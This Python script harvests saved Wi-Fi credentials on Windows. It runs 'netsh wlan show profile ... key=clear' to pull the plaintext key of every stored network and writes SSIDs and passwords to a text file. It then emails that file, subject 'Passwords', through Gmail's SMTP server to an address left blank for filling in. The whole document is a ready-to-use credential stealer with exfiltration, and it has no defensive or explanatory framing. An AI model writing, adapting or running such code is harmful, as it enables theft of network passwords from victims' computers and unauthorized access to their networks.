from contextlib import redirect_stdout
import subprocess
import re
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


command = subprocess.run("netsh wlan show profile", capture_output=True).stdout.decode()
profiles = (re.findall("All User Profile     :(.*)\r", command))
wifi_list = list()
if len(profiles)!= 0:
    for names in profiles:
        wifi_profile = dict()
        profile_info = subprocess.run(f"netsh wlan show profile {names}",capture_output=True).stdout.decode()
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["SSID"] = names
            profile_info_pass = subprocess.run(f"netsh wlan show profile {names} key=clear",capture_output=True).stdout.decode()
            pass_ = re.findall("Key Content            : (.*)\r", profile_info_pass)
            if pass_ == "":
                wifi_profile["Password"] = None
            else:
                wifi_profile["Password"] = pass_
            # print(profile_info_pass)
            wifi_list.append(wifi_profile)
for x in range(len(wifi_list)):
    p = wifi_list[x]
    with open('password.txt', 'a') as f:
        with redirect_stdout(f):
            print(p)




mail_content = '''Hello,
This is a test mail.
'''
#The mail addresses and password
sender_address = ''
sender_pass = ''
receiver_address = ''

#Setup the MIME
message = MIMEMultipart()
message['From'] = sender_address
message['To'] = receiver_address
message['Subject'] = 'Passwords'

#The subject line
#The body and the attachments for the mail
message.attach(MIMEText(mail_content, 'plain'))
attach_file_name = 'password.txt'
attach_file = open(attach_file_name, 'rb') # Open the file as binary mode
payload = MIMEBase('application', 'octate-stream')
payload.set_payload((attach_file).read())
encoders.encode_base64(payload) #encode the attachment

#add payload header with filename
payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
message.attach(payload)

#Create SMTP session for sending the mail
session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
session.starttls() #enable security
session.login(sender_address, sender_pass) #login with mail_id and password
text = message.as_string()
session.sendmail(sender_address, receiver_address, text)
session.quit()
print('Mail Sent')